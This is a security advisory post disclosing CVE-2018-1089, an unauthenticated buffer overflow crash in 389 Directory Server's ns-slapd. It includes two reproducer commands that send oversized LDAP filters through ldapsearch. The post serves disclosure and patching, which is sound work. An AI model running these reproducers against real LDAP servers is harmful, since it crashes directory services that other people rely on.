Subject: CVE-2018-1089 389-ds-base: unauthenticated ns-slapd crash via large
 filter value in ldapsearch

Hi all,

This is to disclose the following flaw, CVE-2018-1089 :

389-ds-base, a.k.a 389 Directory Server, https://pagure.io/389-ds-base/,
is a highly usable, fully featured, reliable and secure LDAP server
implementation. It handles many of the largest LDAP deployments in the
world.

389-ds server did not properly handle characters needed to be escaped in
its query filter. This could result in buffer overflows, from the heap
or the stack, on larger filters.  An unauthenticated attacker could send
a specially crafted LDAP request and crash the server. RCE has not been
demonstrated at this time.

Red Hat would like to thank Greg Kubok for alerting us of the issue.


Reproducer1 :
[root@...ver1 ~]# payload=$(printf '.*$%.0s' {1..1000})
[root@...ver1 ~]# ldapsearch -h localhost -p 389 -x -b "dc=blah"
"(&(|(telephoneNumber=*${payload}*)(uid=*${payload}*)(title=*${payload}*)(sn=*${payload}*)(ou=*${payload}*)(givenName=*${payload}*))(objectClass=posixaccount))"
"telephoneNumber sshpubkeyfp ipaSshPubKey uid krbCanonicalName title
loginShell uidNumber gidNumber sn homeDirectory mail krbPrincipalName
givenName nsAccountLock"

Reproducer2:
[root@...ver1 ~]# perl -e 'print ".*\$" x (1400)' | ldapsearch -x -f-
"(&(uid=%s)(objectClass=posixaccount))"


Patch attached for versions 1.3.7 & 1.2.11

Thanks!
